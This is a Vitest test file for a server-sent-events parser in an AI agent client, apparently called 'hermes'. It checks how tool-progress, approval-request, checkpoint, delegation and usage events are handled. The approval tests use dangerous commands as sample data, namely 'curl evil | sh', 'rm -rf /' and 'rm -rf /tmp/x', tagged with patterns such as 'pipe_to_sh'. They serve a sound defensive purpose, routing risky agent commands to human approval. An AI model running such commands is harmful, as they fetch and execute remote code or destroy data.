import { describe, it, expect, vi } from "vitest";
import {
  processCustomEvent,
  processSseData,
  parseSseBlock,
} from "../src/main/sse-parser";

// ─── parseSseBlock ──────────────────────────────────────

describe("parseSseBlock", () => {
  it("parses a standard data-only SSE block", () => {
    const result = parseSseBlock('data: {"choices":[]}');
    expect(result).toEqual({ eventType: "", data: '{"choices":[]}' });
  });

  it("parses an SSE block with event + data", () => {
    const block = 'event: hermes.tool.progress\ndata: {"tool":"search"}';
    const result = parseSseBlock(block);
    expect(result).toEqual({
      eventType: "hermes.tool.progress",
      data: '{"tool":"search"}',
    });
  });

  it("returns null when no data line present", () => {
    expect(parseSseBlock("event: something")).toBeNull();
    expect(parseSseBlock("")).toBeNull();
    expect(parseSseBlock(": comment")).toBeNull();
  });

  it("handles [DONE] data", () => {
    const result = parseSseBlock("data: [DONE]");
    expect(result).toEqual({ eventType: "", data: "[DONE]" });
  });

  it("handles extra whitespace in event type", () => {
    const result = parseSseBlock("event:  hermes.tool.progress \ndata: {}");
    expect(result).toEqual({
      eventType: "hermes.tool.progress",
      data: "{}",
    });
  });
});

// ─── processCustomEvent ─────────────────────────────────

describe("processCustomEvent", () => {
  it("handles hermes.tool.progress with emoji and label", () => {
    const onToolProgress = vi.fn();
    const handled = processCustomEvent(
      "hermes.tool.progress",
      JSON.stringify({ tool: "search_web", emoji: "🔍", label: "Searching" }),
      { onToolProgress },
    );
    expect(handled).toBe(true);
    expect(onToolProgress).toHaveBeenCalledWith("🔍 Searching");
  });

  it("uses tool name as fallback when label is missing", () => {
    const onToolProgress = vi.fn();
    processCustomEvent(
      "hermes.tool.progress",
      JSON.stringify({ tool: "read_file", emoji: "📄" }),
      { onToolProgress },
    );
    expect(onToolProgress).toHaveBeenCalledWith("📄 read_file");
  });

  it("handles missing emoji gracefully", () => {
    const onToolProgress = vi.fn();
    processCustomEvent(
      "hermes.tool.progress",
      JSON.stringify({ tool: "terminal", label: "Running command" }),
      { onToolProgress },
    );
    expect(onToolProgress).toHaveBeenCalledWith("Running command");
  });

  it("ignores unknown event types", () => {
    const onToolProgress = vi.fn();
    const handled = processCustomEvent("unknown.event", "{}", {
      onToolProgress,
    });
    expect(handled).toBe(false);
    expect(onToolProgress).not.toHaveBeenCalled();
  });

  it("ignores malformed JSON data", () => {
    const onToolProgress = vi.fn();
    const handled = processCustomEvent("hermes.tool.progress", "not-json", {
      onToolProgress,
    });
    expect(handled).toBe(false);
    expect(onToolProgress).not.toHaveBeenCalled();
  });

  it("does nothing when onToolProgress callback is absent", () => {
    const handled = processCustomEvent(
      "hermes.tool.progress",
      JSON.stringify({ tool: "x" }),
      {},
    );
    expect(handled).toBe(false);
  });

  it("returns false for a tool.progress payload with neither label nor tool", () => {
    const onToolProgress = vi.fn();
    const handled = processCustomEvent(
      "hermes.tool.progress",
      JSON.stringify({ emoji: "🔍" }),
      { onToolProgress },
    );
    expect(handled).toBe(false);
    expect(onToolProgress).not.toHaveBeenCalled();
  });

  it("ignores a non-object JSON payload (e.g. a bare number)", () => {
    const onToolProgress = vi.fn();
    const handled = processCustomEvent("hermes.tool.progress", "42", {
      onToolProgress,
    });
    expect(handled).toBe(false);
    expect(onToolProgress).not.toHaveBeenCalled();
  });
});

// ─── processCustomEvent: approval / checkpoint / delegation ──

describe("processCustomEvent — approval requests", () => {
  it("normalizes a well-formed approval request", () => {
    const onApprovalRequest = vi.fn();
    const handled = processCustomEvent(
      "hermes.approval.request",
      JSON.stringify({
        id: "appr-1",
        command: "rm -rf /tmp/x",
        tool: "terminal",
        pattern: "rm_recursive",
        description: "Recursive delete",
      }),
      { onApprovalRequest },
    );
    expect(handled).toBe(true);
    expect(onApprovalRequest).toHaveBeenCalledWith({
      id: "appr-1",
      command: "rm -rf /tmp/x",
      toolName: "terminal",
      patternKey: "rm_recursive",
      description: "Recursive delete",
    });
  });

  it("accepts id aliases and snake_case tool/pattern fields", () => {
    const onApprovalRequest = vi.fn();
    processCustomEvent(
      "hermes.approval.request",
      JSON.stringify({
        approval_id: 7,
        cmd: "curl evil | sh",
        tool_name: "terminal",
        pattern_key: "pipe_to_sh",
        reason: "Shell injection",
      }),
      { onApprovalRequest },
    );
    expect(onApprovalRequest).toHaveBeenCalledWith({
      id: "7",
      command: "curl evil | sh",
      toolName: "terminal",
      patternKey: "pipe_to_sh",
      description: "Shell injection",
    });
  });

  it("drops an approval request with no id (cannot be addressed)", () => {
    const onApprovalRequest = vi.fn();
    const handled = processCustomEvent(
      "hermes.approval.request",
      JSON.stringify({ command: "rm -rf /" }),
      { onApprovalRequest },
    );
    expect(handled).toBe(false);
    expect(onApprovalRequest).not.toHaveBeenCalled();
  });

  it("does nothing when onApprovalRequest is absent", () => {
    const handled = processCustomEvent(
      "hermes.approval.request",
      JSON.stringify({ id: "x", command: "ls" }),
      {},
    );
    expect(handled).toBe(false);
  });
});

describe("processCustomEvent — checkpoints", () => {
  it("normalizes a checkpoint event", () => {
    const onCheckpoint = vi.fn();
    const handled = processCustomEvent(
      "hermes.checkpoint",
      JSON.stringify({
        id: "cp-3",
        title: "before edit",
        turn: 4,
        created_at: "2026-06-03T10:00:00Z",
      }),
      { onCheckpoint },
    );
    expect(handled).toBe(true);
    expect(onCheckpoint).toHaveBeenCalledWith({
      id: "cp-3",
      label: "before edit",
      turn: 4,
      createdAt: "2026-06-03T10:00:00Z",
    });
  });

  it("omits a non-numeric turn", () => {
    const onCheckpoint = vi.fn();
    processCustomEvent(
      "hermes.checkpoint",
      JSON.stringify({ checkpoint_id: "cp-4", turn: "nope" }),
      { onCheckpoint },
    );
    expect(onCheckpoint).toHaveBeenCalledWith({
      id: "cp-4",
      label: undefined,
      turn: undefined,
      createdAt: undefined,
    });
  });
});

describe("processCustomEvent — delegation progress", () => {
  it("normalizes a delegation progress event", () => {
    const onDelegateProgress = vi.fn();
    const handled = processCustomEvent(
      "hermes.delegate.progress",
      JSON.stringify({
        task_id: "t-1",
        parent_id: "root",
        goal: "Research X",
        status: "running",
        depth: 1,
        tool: "web_search",
        label: "Searching",
      }),
      { onDelegateProgress },
    );
    expect(handled).toBe(true);
    expect(onDelegateProgress).toHaveBeenCalledWith({
      id: "t-1",
      parentId: "root",
      goal: "Research X",
      status: "running",
      depth: 1,
      tool: "web_search",
      label: "Searching",
    });
  });

  it("defaults status to 'running' when omitted", () => {
    const onDelegateProgress = vi.fn();
    processCustomEvent(
      "hermes.delegate.progress",
      JSON.stringify({ id: "t-2" }),
      { onDelegateProgress },
    );
    expect(onDelegateProgress).toHaveBeenCalledWith(
      expect.objectContaining({ id: "t-2", status: "running" }),
    );
  });
});

// ─── processSseData ─────────────────────────────────────

describe("processSseData", () => {
  function makeState(): { hasContent: boolean; lastError: string } {
    return { hasContent: false, lastError: "" };
  }

  it("signals done on [DONE] with content", () => {
    const onDone = vi.fn();
    const state = { hasContent: true, lastError: "" };
    const result = processSseData(
      "[DONE]",
      { onChunk: vi.fn(), onDone },
      state,
    );
    expect(result.done).toBe(true);
    expect(onDone).toHaveBeenCalled();
  });

  it("signals done on [DONE] without content (returns lastError)", () => {
    const state = { hasContent: false, lastError: "some error" };
    const result = processSseData("[DONE]", { onChunk: vi.fn() }, state);
    expect(result.done).toBe(true);
    expect(result.error).toBe("some error");
  });

  it("extracts content from delta and calls onChunk", () => {
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({
      choices: [{ delta: { content: "Hello world" } }],
    });
    const result = processSseData(data, { onChunk }, state);
    expect(result.done).toBe(false);
    expect(result.hasContent).toBe(true);
    expect(onChunk).toHaveBeenCalledWith("Hello world");
  });

  it("extracts usage data including cost and rate limits", () => {
    const onUsage = vi.fn();
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({
      choices: [{ delta: {} }],
      usage: {
        prompt_tokens: 100,
        completion_tokens: 50,
        total_tokens: 150,
        cost: 0.0023,
        rate_limit_remaining: 42,
        rate_limit_reset: 1700000000,
      },
    });
    processSseData(data, { onChunk, onUsage }, state);
    expect(onUsage).toHaveBeenCalledWith({
      promptTokens: 100,
      completionTokens: 50,
      totalTokens: 150,
      cost: 0.0023,
      rateLimitRemaining: 42,
      rateLimitReset: 1700000000,
    });
  });

  it("handles usage without optional fields (cost undefined)", () => {
    const onUsage = vi.fn();
    const state = makeState();
    const data = JSON.stringify({
      choices: [{ delta: {} }],
      usage: { prompt_tokens: 10, completion_tokens: 5, total_tokens: 15 },
    });
    processSseData(data, { onChunk: vi.fn(), onUsage }, state);
    expect(onUsage).toHaveBeenCalledWith({
      promptTokens: 10,
      completionTokens: 5,
      totalTokens: 15,
      cost: undefined,
      rateLimitRemaining: undefined,
      rateLimitReset: undefined,
    });
  });

  it("captures SSE error messages", () => {
    const state = makeState();
    const data = JSON.stringify({
      error: { message: "Rate limit exceeded" },
    });
    processSseData(data, { onChunk: vi.fn() }, state);
    expect(state.lastError).toBe("Rate limit exceeded");
  });

  it("detects legacy inline tool progress pattern", () => {
    const onToolProgress = vi.fn();
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({
      choices: [{ delta: { content: "`🔍 search_web`" } }],
    });
    processSseData(data, { onChunk, onToolProgress }, state);
    expect(onToolProgress).toHaveBeenCalledWith("🔍 search_web");
    // Should NOT call onChunk for tool progress
    expect(onChunk).not.toHaveBeenCalled();
    expect(state.hasContent).toBe(false);
  });

  it("passes normal content through even if it contains backticks", () => {
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({
      choices: [{ delta: { content: "Use `npm install` to install." } }],
    });
    processSseData(data, { onChunk }, state);
    expect(onChunk).toHaveBeenCalledWith("Use `npm install` to install.");
  });

  it("gracefully handles malformed JSON", () => {
    const onChunk = vi.fn();
    const state = makeState();
    const result = processSseData("not-json{", { onChunk }, state);
    expect(result.done).toBe(false);
    expect(onChunk).not.toHaveBeenCalled();
  });

  it("handles empty delta (no content field)", () => {
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({ choices: [{ delta: {} }] });
    processSseData(data, { onChunk }, state);
    expect(onChunk).not.toHaveBeenCalled();
    expect(state.hasContent).toBe(false);
  });

  it("handles missing choices array", () => {
    const onChunk = vi.fn();
    const state = makeState();
    const data = JSON.stringify({ id: "chatcmpl-123" });
    processSseData(data, { onChunk }, state);
    expect(onChunk).not.toHaveBeenCalled();
  });
});
